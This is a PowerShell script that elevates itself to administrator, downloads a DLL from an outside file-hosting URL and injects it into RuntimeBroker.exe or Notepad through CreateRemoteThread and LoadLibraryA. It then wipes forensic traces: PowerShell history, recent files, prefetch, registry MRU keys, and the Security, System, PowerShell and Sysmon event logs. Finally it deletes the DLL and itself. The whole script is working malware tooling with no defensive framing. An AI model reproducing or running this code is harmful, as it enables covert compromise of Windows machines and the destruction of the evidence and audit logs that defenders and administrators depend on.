# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}
# === Fixed LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    
    # Check if type already exists to avoid errors on re-run within same session
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
# === 1. Clear Temp Folder ===
Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temp cleared." -ForegroundColor Green
}
catch {
    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
}
# === 2. Download DLL to %TEMP% with Random Name ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$dllFileName = "$randomGuid.dll"
$dllPath = Join-Path $env:TEMP $dllFileName
$dllUrl = "https://files.catbox.moe/1wlvqc.dll"

try {
    Write-Host "[+] Downloading DLL from: $dllUrl" -ForegroundColor Cyan
    Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
    
    $webClient.DownloadFile($dllUrl, $dllPath)
    $webClient.Dispose()
    
    if (Test-Path $dllPath) {
        $fileSize = (Get-Item $dllPath).Length
        if ($fileSize -gt 0) {
            Write-Host "[+] Download successful! File size: $fileSize bytes" -ForegroundColor Green
        } else {
            throw "File size is 0 bytes - download may have failed"
        }
    } else {
        throw "File not found after download."
    }
}
catch {
    Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Trying alternative download method..." -ForegroundColor Yellow
    
    try {
        Write-Host "[+] Using Invoke-WebRequest as fallback..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
            Write-Host "[+] Download successful via fallback!" -ForegroundColor Green
        } else {
            throw "Fallback download failed"
        }
    }
    catch {
        Write-Host "[!] All download methods failed: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}
# === ตรวจสอบไฟล์ DLL ก่อนทำการ Inject ===
try {
    $fileInfo = [System.IO.File]::ReadAllBytes($dllPath)
    if ($fileInfo.Length -lt 1024) {
        Write-Host "[!] Warning: DLL file is very small (possible download error)" -ForegroundColor Yellow
    }
    Write-Host "[+] DLL file verified. Size: $($fileInfo.Length) bytes" -ForegroundColor Green
}
catch {
    Write-Host "[!] Could not verify DLL: $($_.Exception.Message)" -ForegroundColor Yellow
}

# === ค้นหา RuntimeBroker.exe ที่กำลังทำงานอยู่ หรือใช้ Notepad เป็น Fallback ===
Write-Host ""
Write-Host "[+] Looking for RuntimeBroker.exe process..." -ForegroundColor Yellow

$proc = $null
$targetProcess = "RuntimeBroker"
$targetExe = "RuntimeBroker.exe"

# 1. ลองค้นหา RuntimeBroker ที่กำลังทำงานอยู่
try {
    $existingProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($existingProc) {
        Write-Host "[+] Found existing RuntimeBroker.exe (PID: $($existingProc.Id))" -ForegroundColor Green
        $proc = $existingProc
    }
} catch {
    Write-Host "[!] Could not find existing RuntimeBroker process" -ForegroundColor Yellow
}

# 2. ถ้าไม่เจอ ให้ลองเปิด Notepad แทน
if (-not $proc) {
    Write-Host "[!] RuntimeBroker.exe not found or not running" -ForegroundColor Yellow
    Write-Host "[+] Using Notepad.exe as target process instead..." -ForegroundColor Cyan
    
    try {
        $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
        $targetProcess = "notepad"
        $targetExe = "notepad.exe"
        
        Start-Sleep -Seconds 2
        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        
        if (-not $proc) {
            Write-Host "[!] Failed to start Notepad.exe" -ForegroundColor Red
            exit 1
        }
        Write-Host "[+] Successfully launched Notepad.exe (PID: $($proc.Id))" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# 3. ถ้ายังไม่มี process ให้ error
if (-not $proc) {
    Write-Host "[!] No target process available" -ForegroundColor Red
    exit 1
}

$pid1 = $proc.Id
Write-Host "[+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green

# === Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    
    $LoadLibraryADelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll LoadLibraryA),
        (getDelegateType @([String]) ([IntPtr]))
    )
    
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    # PROCESS_ALL_ACCESS (0x001F0FFF)
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
        Write-Host "[!] Trying with PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE (0x0002 | 0x0008 | 0x0020)..." -ForegroundColor Yellow
        
        # ลองใช้สิทธิ์น้อยลง
        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)  # 0x002A = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
        
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[!] Still failed to open process handle" -ForegroundColor Red
            exit 1
        }
    }
    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
    
    # Allocate memory for the DLL path string
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
    
    # Convert DLL path to bytes
    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    
    # Write DLL path to remote process
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    
    if (-not $res) {
        Write-Host "[!] Failed to write memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Memory Written: $res" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
    
    # Create remote thread to load the DLL
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[✓] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
    } else {
        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
}

# === Enhanced Cleanup & Anti-Forensics ===
Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan

# 1. Clear PowerShell History (Memory & File Content)
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# 2. Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# 3. Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 4. Clear Prefetch (Multiple Attempts to Catch Re-created Files)
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 5. Clear INetCache (IE/Edge Cache)
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# 6. Clear Temp Folder Again (in case anything was recreated)
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# 7. Clear Registry MRU Keys (User-specific)
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# 8. Clear Event Logs (Requires Admin)
$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
foreach ($logName in $logNames) {
    try {
        wevtutil cl $logName 2>$null
    } catch {
        # Ignore errors if log doesn't exist or access denied
    }
}

# 9. Delete the random DLL from Temp
Start-Sleep -Seconds 1
if (Test-Path $dllPath) { 
    try { 
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] DLL file removed: $dllPath" -ForegroundColor Green
    } catch {
        Write-Host "[!] Could not remove DLL file: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# 10. Delete the script itself
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    try {
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Script self-deleted" -ForegroundColor Green
    } catch {
        Write-Host "[!] Could not delete script" -ForegroundColor Yellow
    }
}

# 11. Force GC and wait a bit to let system settle
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
Start-Sleep -Seconds 2
Write-Host "[+] Cleanup complete" -ForegroundColor Green
exit
